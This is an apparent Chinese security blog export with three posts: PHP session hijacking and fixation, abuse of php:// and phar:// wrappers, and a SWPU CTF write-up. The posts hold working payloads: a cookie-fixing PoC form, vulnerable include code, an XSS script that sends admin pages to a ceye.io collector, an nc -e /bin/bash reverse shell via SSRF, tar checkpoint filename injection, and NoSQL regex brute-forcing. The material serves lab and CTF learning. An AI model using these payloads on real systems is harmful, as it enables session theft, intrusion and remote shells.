+<p>而在服务器端，会有一个sess_………………  命名的文件保存用户信息。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153052-f14152ec-3bf3-1.png" alt><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153053-f1c88cc6-3bf3-1.png" alt><br>这里后台代码仅仅简单写了一个用户权限功能，实际上会记录更全面的用户信息，而里面的信息全部被序列化存储。</p>
+<h1 id="session劫持"><a href="#session劫持" class="headerlink" title="session劫持"></a>session劫持</h1><p>要明白session劫持，首先需要清楚session id的存储位置，sessionid不仅仅存储在cookie中，也可能存储在post get（很少见），或者由url重写来完成，还有一部分存储在隐藏域中，一般首选是存储在cookie中，当禁用了cookie传递之后就会重写在url里，在url里传递很容易暴露造成更多的安全问题，在允许cookie传递的时候首选cookie，在php中提供了session.use_only_cookies选项，</p>
+<p>session劫持实际上就是自己的PHPSESSID被攻击者以某种方式获取，然后在会话的有效期内，利用被攻击者的身份登录网站，来达到身份劫持，伪装成合法用户。一般PHPSESSID存储在cookie中，XSS攻击也会造成session劫持。</p>
+<p>session成功劫持一般需要几个步骤，</p>
+<p>1.用户访问的平台是使用session来进行身份认证。<br>2.用户已经使用账号密码登录该平台，随即该用户会得到一个sessionid。<br>3.通过劫持获取到sessionid，并且在sessionid的有效期内使用（未注销前）。  </p>
+<p>那么如何获得sessionid是关键，接下来会谈到，一般可以使用</p>
+<p>1.劫持：XSS劫持，局域网嗅探，会话固定结合，任意文件读取漏洞等等。<br>2.爆破：直接通过大流量爆破出sessionid（一般是不太可能)。<br>3.得到session生成规则，并且得到签名通过计算获取。  </p>
+<h2 id="规则爆破"><a href="#规则爆破" class="headerlink" title="规则爆破"></a>规则爆破</h2><p>通过知道规则来进行爆破，不过这种方法基本上是没可能的局限性太多，且概率极小，php中的sessionid举例而言。生成规则如下。</p>
+<p>PHPSESSID生成<br>生成规则是根据hash_func散列来生成的，相关的参数有：   </p>
+<ul>
+<li>客户端IP   </li>
+<li>当前时间（秒）     </li>
+<li>当前时间（微秒）   </li>
+<li>PHP自带的随机数生产器  </li>
+</ul>
+<p>秒微秒可以爆破，随机数也可能是伪随机，客户端IP也可以某种手段获取，但是四种同时精准获取，难度极大，但是不排除有成功的可能性。根据生成规则，也有可能爆破出，但是相对来说几乎不太可能。</p>
+<h2 id="利用XSS或者文件读取"><a href="#利用XSS或者文件读取" class="headerlink" title="利用XSS或者文件读取"></a>利用XSS或者文件读取</h2><p>利用xss反弹到的cookie，来伪造身份登录。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153054-f26b7094-3bf3-1.png" alt><br>使用被攻击者的PHPSESSID，rv3kprfodknmqdrnf0cuial8r6</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153055-f2ff294c-3bf3-1.png" alt><br>即可利用管理员的session来登录，前提是必须在会话有效期内使用。</p>
+<p>或者利用任意文件读取，XXE等来进行读取文件名来获取sessionid，服务端保存的都是在有效期内的session。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153056-f3be3c10-3bf3-1.png" alt></p>
+<h2 id="会话固定劫持"><a href="#会话固定劫持" class="headerlink" title="会话固定劫持"></a>会话固定劫持</h2><p>会话固定也属于劫持的一种，或者说他是通过攻击者诱导使用固定的sessionid。会话固定的流程主要为</p>
+<p>1.攻击者通过构造url参数或者表单传递来固定sessionid。<br>2.诱使用户使用攻击者构造的参数来登陆。<br>3.在用户登录之后，攻击者直接使用自己之前构造的固定sessionid来登陆。  </p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153057-f45090f6-3bf3-1.jpg" alt></p>
+<p>会话固定漏洞并不常见，并且在早期通常是使用url来传递sessionid，这样更极大方便了攻击者，因为只要简单构造一条url，并且对于用户是很正常的url，例如，<a href="http://www.taobao.com?sessionid=test123，在用户使用这条url去登陆的时候就会固定了sessionid，就可能造成会话固定劫持漏洞。重置sessionid可由如下。" target="_blank" rel="noopener">www.taobao.com?sessionid=test123，在用户使用这条url去登陆的时候就会固定了sessionid，就可能造成会话固定劫持漏洞。重置sessionid可由如下。</a></p>
+<p>1.通过xss漏洞，可以通过js设置cookie中的sessionid。document.cookie=”sessionid=test123”<br>2.通过url传递，直接构造url–&gt;<a href="http://www.taobao.com?sessionid=test123" target="_blank" rel="noopener">www.taobao.com?sessionid=test123</a><br>3.使用Set-Cookie的HTTP响应头部设置Cookie。攻击者可以使用一些方法在Web服务器的响应中加入Set-Cookie的HTTP响应头部,通过自己的服务器页面绑定sessionid。</p>
+<p>接下来我们通过一个简单的php认证来做一次会话固定劫持，后端对身份验证代码如下。</p>
+<pre><code>&lt;?php session_start();?&gt;
+if($_POST[&apos;zhanghao&apos;] == $username &amp;&amp; $_POST[&apos;mima&apos;] == $password)
+    {
+
+    $_SESSION[&quot;name&quot;]=$username;
+    }
+
+if ($_SESSION[&apos;name&apos;] == &quot;&quot;)
+{
+    echo &quot;&lt;script&gt;alert(&apos;对不起，你没有权限&apos;);location.href=&apos;index.php&apos;&lt;/script&gt;&quot;;
+}</code></pre><p>此时攻击者构造一个表单页面。通过js来设置cookie造成会话固定攻击。此时使用户登陆。</p>
+<pre><code>&lt;html&gt;  
+  &lt;meta charset=&quot;utf-8&quot;  content=&quot;text/html; charset=gb2312&quot;/&gt;
+    &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
+    &lt;body&gt;
+    &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;
+      &lt;form action=&quot;http://127.0.0.1/login.php&quot; method=&quot;POST&quot;&gt;
+      用户名称：&lt;input type=&quot;text&quot; name=&quot;zhanghao&quot;&gt;&lt;br/&gt;&lt;br/&gt;
+      用户密码：&lt;input type=&quot;password&quot; name=&quot;mima&quot;&gt;&lt;br/&gt;&lt;br/&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;denglu&quot; value=&quot;&amp;#153;&amp;#187;&amp;#189;&amp;#149;&quot; /&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
+        &lt;meta http-equiv=&apos;Set-Cookie&apos; content=&apos;PHPSESSID=22333&apos;&gt;
+      &lt;/form&gt;
+      &lt;script type=&apos;text/javascript&apos;&gt; document.cookie=&apos;PHPSESSID=123456789&apos; &lt;/script&gt;
+    &lt;/body&gt;
+  &lt;/html&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153058-f52e33ca-3bf3-1.png" alt></p>
+<p>此时抓包可以看到，提交的SESSID是我们构造的，而且服务器端暂时未创建123456789的用户session，然后用户点击提交。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153059-f5c40094-3bf3-1.png" alt>  </p>
+<p>可以看到服务器端成功创建了我们构造的session，然后攻击者便可以通过PHPSESSID=123456789造成合法登陆，由此便造成了一次完整的会话固定劫持，当然如果是url传递将更加方便，直接在url里加入自己的sessionid，用户点击正常的url登陆即可。</p>
+<h1 id="cookie造成的一些安全隐患"><a href="#cookie造成的一些安全隐患" class="headerlink" title="cookie造成的一些安全隐患"></a>cookie造成的一些安全隐患</h1><p>在session身份认证中，一切用户的session都会存储在服务器，但是如果一旦用户量达到一个上限，那么对于服务器的荷载也是巨大的，但是在cookie实现身份认证中，并不会存储在服务器，而是存储在用户的客户端，cookie的出现是一次重大的变革，也是一项非常有争议的技术，原因就是因为他的透明性以及信息量，很容易泄露用户的隐私。</p>
+<p>在session如果不设置过期时间，在服务器上就会一直存在，永远不会注销，在cookie中如果不设置过期时间，则在关闭浏览器时销毁该cookie，session会给服务器造成很大的负载，但是cookie并不存在这个问题，它将信息保存在了每个用户的客户端。淘宝便是使用了cookie存储一部分信息。</p>
+<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>cookie中存取了大量用户的信息，如身份id，浏览次数，手机号，等一些隐私信息，截取了某平台的cookie信息，存储的信息量非常多，Cookie的主要功能是实现用户个人信息的记录，它最根本的用途是帮助Web站点保存有关访问者的信息，可是一旦泄露除了信息泄露，攻击者无疑也可以通过用户身份登录，无疑也是很大的隐患。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153100-f6790674-3bf3-1.png" alt></p>
+<p>Cookie以纯文本的形式在浏览器和服务器之间传送，大多明文的形式被非法用户截获之后无疑是身份被盗取了，并且身份的信息也被盗取了，通过xss漏洞很容易获得cookie，如果没有做好防护措施，便会使用户的信息泄露。</p>
+<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>在cookie的身份认证中，极容易造成越权，切大多数越权修改参数都是在cookie中修改，大多数cookie中会有用户的userid，如果未合理的处理或者多重认证，很容易造成越权。在某安全公司的一次测试中，正是由于一次id的接口错误的设置，导致数万用户的平行越权，遍历ID，造成信息的泄露。危害可见一斑。</p>
+<p>参考：<a href="https://blog.csdn.net/h_mxc/article/details/50542038" target="_blank" rel="noopener">https://blog.csdn.net/h_mxc/article/details/50542038</a><br>参考：<a href="https://blog.csdn.net/u010084228/article/details/78269345" target="_blank" rel="noopener">https://blog.csdn.net/u010084228/article/details/78269345</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/02/28/身份认证劫持/" data-id="ck0l0oha2002cpy2iyt9y7afh" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web漏洞/">web漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-php协议漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/25/php协议漏洞/" class="article-date">
+  <time datetime="2018-12-24T16:00:00.000Z" itemprop="datePublished">2018-12-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/25/php协议漏洞/">php的协议漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="1-php-input"><a href="#1-php-input" class="headerlink" title="1.php://input"></a>1.php://input</h1><p>在php中，如果配置文件开启不当，则可能造成php://input来getshell 命令执行。</p>
+<p>前提  </p>
+<pre><code>1.在allow_url_include = On   
+2.PHP &gt;= 5.2.0</code></pre><p>当然如果开启了远程文件包含则可以任意getshell。不过在一些攻防赛中，节约时间直接php://input则可能更快的得分留后门。</p>
+<p>首先在php.ini 文件打开设置如上第一个条件。源码</p>
+<pre><code>&lt;?php
+include($_GET[&apos;url&apos;]);
+?&gt;</code></pre><p>直接进行包含即可，<img src="https://i.imgur.com/fJkQE5i.png" alt></p>
+<p>当然这种情况一般不可能出现在实战中，CTF中可能会用到，或者一些隐蔽后门。</p>
+<h1 id="2-php-filter"><a href="#2-php-filter" class="headerlink" title="2.php://filter"></a>2.php://filter</h1><p>在一些CTF中，经常用到文件包含造成任意文件源码读取。同样漏洞源码</p>
+<pre><code>&lt;?php
+include($_GET[&apos;url&apos;]);
+?&gt;</code></pre><p><a href="http://127.0.0.1/000.php?url=php://filter/read=convert.base64-encode/resource=./index.php" target="_blank" rel="noopener">http://127.0.0.1/000.php?url=php://filter/read=convert.base64-encode/resource=./index.php</a><br><img src="https://i.imgur.com/dThe4OD.png" alt></p>
+<h1 id="3-phar"><a href="#3-phar" class="headerlink" title="3.phar://"></a>3.phar://</h1><h2 id="绕过上传getshell"><a href="#绕过上传getshell" class="headerlink" title="绕过上传getshell"></a>绕过上传getshell</h2><p>在一些过滤上传，只允许上传jpg文件的时候，可以通过phar://协议来绕过上传造成getshell。接下来实例，上传php的一段代码。</p>
+<pre><code>&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+if($_FILES[&quot;file&quot;][&quot;error&quot;]&gt;0)
+{
+    echo &quot;Error:&quot;.$FILES[&quot;file&quot;][&quot;error&quot;].&quot;&lt;br/&gt;&quot;;
+}
+else
+{
+    echo &quot;Upload name:&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;].&quot;&lt;br/&gt;&quot;;#被上传文件的名称
+    echo &quot;Type:&quot;.$_FILES[&quot;file&quot;][&quot;type&quot;].&quot;&lt;br/&gt;&quot;;#上传文件的类型
+    echo &quot;size:&quot;.($_FILES[&quot;file&quot;][&quot;size&quot;]/1024).&quot;kb&lt;br/&gt;&quot;;#上传文件的大小（kb）
+echo &quot;Stored in:&quot;.$_FILES[&quot;file&quot;][&quot;tmp_name&quot;].&quot;&lt;br/&gt;&quot;;#存储在服务器的文件的临时副本的名称
+}
+
+$waf = explode(&quot;.&quot;, $_FILES[&apos;file&apos;][&apos;name&apos;]);
+if(end($waf)==&quot;jpg&quot;)
+{
+if(file_exists(&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]))
+{
+    echo $_FILES[&quot;file&quot;][&quot;name&quot;].&quot; already exists&quot;;
+}
+else
+{
+    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);
+    echo &quot;Stored in :&quot; .&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];
+}
+}
+else{
+echo &apos;&lt;script&gt;alert(&quot;不允许上传的类型&quot;)&lt;/script&gt;&apos;;
+}
+?&gt;
+&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;
+&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;/&gt;
+&lt;br/&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;/&gt; 
+&lt;/form&gt;</code></pre><p>这段代码（粗略的写了一波，其他方式随便绕过）设置只允许jpg上传，但是在某些条件下我们可以通过文件包含来造成绕过上传配合包含getshell。</p>
+<p>还是配合漏洞代码。</p>
+<pre><code>&lt;?php
+include($_GET[&apos;url&apos;]);
+?&gt;</code></pre><p>我们先创建一个php文件，然后写马进去，然后解压，解压之后修改后缀名为jpg，然后再利用phar协议读取文件，通过包含造成getshell。</p>
+<p><img src="https://i.imgur.com/gYMXUZY.png" alt></p>
+<p>其实既然存在文件包含，并不需要phar读取，单纯jpg文件包含也会以php解析，但是这不失为一种猥琐思路，在一些ctf中还是经常能遇到的。</p>
+<h2 id="phar造成的反序列化漏洞。"><a href="#phar造成的反序列化漏洞。" class="headerlink" title="phar造成的反序列化漏洞。"></a>phar造成的反序列化漏洞。</h2><p>环境apache+php5.4<br>php.ini中必须设置phar.readonly=Off，不然Phar文件就会无法生成。前面的分号注意去掉。</p>
+<p>前言，在php中对一个文件压缩时候，部分信息会序列化，而配合 file_exists（ ），is_dir（）等文件解析文件时会进行反序列化，而造成反序列化漏洞。接下来我们详解。</p>
+<p>1.a stub<br>可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
+<p>2.核心meta-data</p>
+<p>phar文件本质上是压缩文件，我们通过phar协议来读取压缩文件。在压缩的时候，压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data。我们通过这部分序列化，来造成后面的攻击。</p>
+<p>3.被压缩的文件<br>及内容并不重要，因为我们需要的是meta-data的反序列化。</p>
+<p>4.a signature for verifying Phar integrity<br>签名格式</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221211646-aada296c-0522-1.png" alt></p>
+<p>先利用php代码生成phar文件。</p>
+<pre><code>&lt;?php
+    class Test{
+        public $test=&quot;test&quot;;
+    }
+    @unlink(&quot;test.phar&quot;);
+    $phar = new Phar(&quot;test.phar&quot;); //后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+    $o = new Test();
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件，内容无所谓。
+    $phar-&gt;stopBuffering();    //签名自动计算
+?&gt;</code></pre><p>执行php文件生成test.phar的文件。<img src="https://i.imgur.com/lL8VOBm.png" alt>，可以看到已经进行了序列化。</p>
+<p>在使用Phar:// 协议流解析Phar文件时，Meta-data中的内容也会进行反序列化。</p>
+<pre><code>&lt;?php
+echo file_get_contents(&quot;phar://./test.phar/test.txt&quot;);
+?&gt;</code></pre><p><img src="https://i.imgur.com/EMNiWST.png" alt><br>可以看到已经反序列化读到了phar文件里的test.txt</p>
+<p>php的许多文件系统函数在phar://解析时都会反序列化。<br><img src="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" alt></p>
+<p>这里简单理解下，</p>
+<pre><code>&lt;?php
+    class TestObject {
+    }
+    @unlink(&quot;phar.phar&quot;);
+    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+    $o = new TestObject();
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+?&gt;</code></pre><p>先生成phar.phar文件。然后测试php代码。</p>
+<pre><code>&lt;?php
+class TestObject {
+        public function __destruct() {
+            echo &apos;Destruct called&apos;;
+        }
+    }
+
+     if(file_exists($_GET[&apos;file&apos;]))
+         exit;
+?&gt;</code></pre><p><img src="https://i.imgur.com/8f3zlTg.png" alt></p>
+<p>可以看到输出了 Destruct called，成功执行了类TestObject。代码</p>
+<pre><code>if(file_exists($_GET[&apos;file&apos;]))
+    exit;</code></pre><p>相当于变成了 $o = new TestObject();</p>
+<p>在file_exists时候反序列化，还原了传入的php代码。</p>
+<p>参考swpu的一道CTF题目–&gt;&gt; SimplePHP <a href="https://www.anquanke.com/post/id/168338" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168338</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/12/25/php协议漏洞/" data-id="ck0l0oh9i0010py2ihpth57uc" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web漏洞/">web漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-第九届swpuctf" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/21/第九届swpuctf/" class="article-date">
+  <time datetime="2018-12-20T16:00:00.000Z" itemprop="datePublished">2018-12-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/21/第九届swpuctf/">swpu第九届线上ctf</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在历届swpuctf中题质量都是比较高的，此次有幸第一次参加swpuctf，题质量确实很高。期待明年的题目- -！！！</p>
+<p>总结三道本次比赛的web题目。</p>
+<h1 id="1-有趣的邮箱注册"><a href="#1-有趣的邮箱注册" class="headerlink" title="1.有趣的邮箱注册"></a>1.有趣的邮箱注册</h1><p>首先打开页面。很正常的一个标准页面。没啥信息。</p>
+<p><img src="https://i.imgur.com/cRAqWlV.png" alt></p>
+<p>左上角有邮箱验证。打开邮箱验证。测试也并没有注入。还有个后台管理。</p>
+<p><img src="https://i.imgur.com/ZtQn4y5.png" alt><br>不允许外地访问。X-Forward-For:127.0.0.1 也不好使。<br>这个时候应该是ssrf，但是并没有ssrf的点。这时候考虑注册邮箱的时候会返回注册的邮箱，那么应该会有XSS。XSS加载脚本导致ssrf。<br><img src="https://i.imgur.com/hzlmUbK.png" alt></p>
+<p>但是有邮箱验证。需要绕过，<br>利用双引号绕过邮箱注册。如 </p>
+<pre><code>&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;@qq.com。  </code></pre><p>可以看到出现了弹窗。  </p>
+<p>此时可以加载js脚本了。</p>
+<pre><code>var a = new XMLHttpRequest();
+a.open(&apos;GET&apos;, &apos;http://localhost:6324/admin/admin.php&apos;, false);
+a.send(null);
+b = a.responseText;
+location.href = &apos;http://3jma2m.ceye.io/d?&apos; + escape(b);</code></pre><p>poc </p>
+<pre><code>&quot;&lt;script/src=http://47.106.xx.XX/11.js&gt;&lt;/script&gt;&quot;@qq.com</code></pre><p>这里js写在我的vps主机上，执行js之后，将页面返回的信息以url的形式去访问。这里我们使用<a href="http://ceye.io来接收访问信息。" target="_blank" rel="noopener">http://ceye.io来接收访问信息。</a></p>
+<p><img src="https://i.imgur.com/SZ5ZWLP.png" alt></p>
+<p>可以看到是个命令执行。</p>
+<p>然后我们继续构造ssrf来执行命令反弹shell</p>
+<pre><code>var a = new XMLHttpRequest();
+a.open(&apos;GET&apos;, &apos;http://localhost:6324/admin/a0a.php?cmd=nc+-e+%2fbin%2fbash+47.106.xx.xx+8888&apos;, false);
+a.send(null);
+b = a.responseText;
+location.href = &apos;http://3jma2m.ceye.io/d&apos; + escape(b);</code></pre><p>第二行注意反弹shell要编码</p>
+<pre><code>http://localhost:6324/admin/a0a.php?cmd=nc+-e+%2fbin%2fbash+47.106.xx.xx+8888</code></pre><p>本地vps 监听 nc -lvvp 8888</p>
+<p>此时我们可以看到反弹shell成功，</p>
+<p><img src="https://i.imgur.com/po9WELn.png" alt></p>
+<p>但是flag文件需要权限，而我们权限看不到。<br>此时寻找目录发现一个没见过的目录。</p>
+<p><img src="https://i.imgur.com/QTD9hBm.png" alt></p>
+<p>打开url <a href="http://118.89.56.208:6324/4f0a5ead5aef34138fcbf8cf00029e7b/" target="_blank" rel="noopener">http://118.89.56.208:6324/4f0a5ead5aef34138fcbf8cf00029e7b/</a></p>
+<p><img src="https://i.imgur.com/dsS92pt.png" alt></p>
+<p>看到上传和备份文件瞬间就想到了上传文件备份拿shell。但是这里发现上传php文件也可以，那很清楚问题不简单。上传之后找不到路径。经过一番思索，他确实不给路径你也找不到。此时，利用该刚刚的低权shell。查看一个可以看的文件 backup.php。</p>
+<pre><code>&lt;?php
+include(&quot;upload.php&quot;);
+echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;;
+$sys = &quot;tar -czf z.tar.gz *&quot;;
+chdir($upload_dir);
+system($sys);
+if(file_exists(&apos;z.tar.gz&apos;)){
+        echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;;
+        echo &quot;备份文件名: z.tar.gz&quot;;
+}else{
+        echo &quot;未上传文件，无法备份！&quot;;
+}
+?&gt;</code></pre><p>所有东西都很正规。唯一有一句看着有点像有问题的样子。</p>
+<pre><code>$sys = &quot;tar -czf z.tar.gz *&quot;;
+chdir($upload_dir);
+system($sys);</code></pre><p>system 敏感函数。可能问题出在这里。然后就有了下面这篇文章，</p>
+<p><a href="https://blog.csdn.net/qq_27446553/article/details/80943097" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/80943097</a></p>
+<p>读完之后发现这里会有一个命令执行。猜测。应该是需要用flag的身份来查看flag文件。也就是利用flag权限执行命令。</p>
+<p>poc为：</p>
+<p>上传三个文件。</p>
+<p>名字分别为。</p>
+<pre><code>6.sh
+--checkpoint-action=exec=sh 6
+--checkpoint=1</code></pre><p>然后备份文件。看上面那篇文章就可以了。重点在–。导致命令执行。<br>得到flag。</p>
+<p><img src="https://i.imgur.com/hqnMSul.png" alt><br>对我来说很喜欢这道题，学到了很多。</p>
+<h1 id="2-Injection"><a href="#2-Injection" class="headerlink" title="2.Injection ???"></a>2.Injection ???</h1><p>nosql注入。</p>
+<p>这道题相对比较简单。但是在我的知识盲区。还是记录下。</p>
+<p>打开就是个登陆框，弱口令万能密码注入，全都无效。题目给的名字是注入。试了半天，总不可能毫无人性的不是注入把。但是确实没弄出来，涉及到知识盲区了。nosql注入。不晓得的可以百度了解下，也就是对一些不适用于sql语句的数据库。我们需要用非sql语句来注入。</p>
+<p><img src="https://i.imgur.com/gHY8Fz5.png" alt></p>
+<p>查看页面源码有个提示。</p>
+<pre><code>&lt;!-- tips:info.php --&gt;</code></pre><p>查看phpinfo，显示拓展是mongodb数据库，那应该就是nosql注入了。参考文章链接：<a href="https://www.secpulse.com/archives/3278.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/3278.html</a></p>
+<p>简单说一下，也就是利用php的传递参数的松散性。我们可以传递数组。而因为mongodb数据库解析参数的特性，可以通过正则来采猜解账号密码。</p>
+<p>给出一组poc。<br><img src="https://i.imgur.com/RJvSxR7.png" alt><br>我们先匹配账号 所以密码 写为password[$regex]=1？<br>也就是匹配1一次或0次，不论如何都会为真。按照这个套路就可以匹配完账号。<br>账号为admin，所以匹配为真。如果username[$regex]=b，则会说账号密码错误。这样逐为爆破出账号密码登陆即可弹出flag。</p>
+<h1 id="3-用优惠码-买个-X-？"><a href="#3-用优惠码-买个-X-？" class="headerlink" title="3.用优惠码 买个 X ？"></a>3.用优惠码 买个 X ？</h1><p>本来想写flask那个python题，奈何没学过python开发，实在头疼。</p>
+<p>这道题涉及到php伪随机数，也是第一次遇到，学习一下。</p>
+<p>首先注册一个账号会给你一个十五位的邀请码，邀请码是随即种子生成的，利用邀请码来进行下一步的绕过。这里先说第一步，重点也是第一波php伪随机数的爆破。</p>
+<p><a href="http://www.zip源码泄露。get源码" target="_blank" rel="noopener">www.zip源码泄露。get源码</a> 通读源码。.</p>
+<pre><code>&lt;?php
+//生成优惠码
+$_SESSION[&apos;seed&apos;]=rand(0,999999999);
+function youhuima(){
+    mt_srand($_SESSION[&apos;seed&apos;]);
+    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+    $auth=&apos;&apos;;
+    $len=15;
+    for ( $i = 0; $i &lt; $len; $i++ ){
+        if($i&lt;=($len/2))
+              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);
+        else
+              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);
+    }
+    setcookie(&apos;Auth&apos;, $auth);
+}
+//support
+    if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){
+        if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){
+               //执行命令
+        }else {
+              //flag字段和某些字符被过滤!
+        }
+    }else{
+             // 你的输入不正确!
+    }
+?&gt;</code></pre><p>不难发现，这是两端php，第一段是php伪随机数，第二个是下一步绕过。</p>
+<p>通读第一部分源码，从一串构造的字符串中选取字符来构造为15长度的随即码，其实并不随机。因为一旦你知道了mt_rand，那么这串数字还是随机的吗，显然并不是，为什么说随机数并不随机，我们来进行下如下测试。</p>
+<pre><code>&lt;?php
+mt_srand(10);
+echo mt_rand();
+?&gt; </code></pre><p>自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。</p>
+<p>简单的如上代码，其实进行播种10。你会发现打印出来mt_rand() 始终为502355954，也就是。在实际情况中不再需要mt_srand播种，上图简单测试下，种子确定的话，随机数也将是确定的。实际情况中mt_rand()即可产生随机数，种子范围为(0,999999999)，也就是会产生十亿个随机数，这个时候发现如果有这么一个爆破工具，那么随机数不再随机我们只需要爆破出种子即可。</p>
+<p>经过上面的解释，你现在是不是对随机数有些了解了。结合题目，只要我们知道种子，即可生成二十四位的优惠码，然后即可进行下一步操作。但是这咯需要提示的是，php不同版本随机数是不一样的，如7.0与7.2不一样，所以如果你要和题目中的php版本严格匹配才能爆破出正确的种子。</p>
+<p>推荐一款工具 php_mt_seed-4.0</p>
+<pre><code>&lt;?php
+$allowable_characters = &apos;abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789&apos;;
+$len = strlen($allowable_characters) - 1;
+$pass = $argv[1];
+for ($i = 0; $i &lt; strlen($pass); $i++) {
+  $number = strpos($allowable_characters, $pass[$i]);
+  echo &quot;$number $number 0 $len  &quot;;
+}
+echo &quot;\n&quot;;
+?&gt;</code></pre><p>此题爆破脚本官方writeup上有，生成 交给 php_mt_seed-4.0即可，</p>
+<p>对于RCE绕过。</p>
+<p>if (preg_match(“/^\d+.\d+.\d+.\d+$/im”,$ip)){<br>重点在参数m。</p>
+<p>当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 “n” 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。<br>也就是说 ^和$会匹配 字符串中n之前和之后，也会匹配整个字符串的开始和结尾，但是只要匹配到一个就会返回正确</p>
+<p>绕过选择 [c]at [f][l][a][g]。linux中会匹配[]中任意一个字符，或者 选择转义 ca\t f\lag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/12/21/第九届swpuctf/" data-id="ck0l0oh9z0026py2i43dnmx9i" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
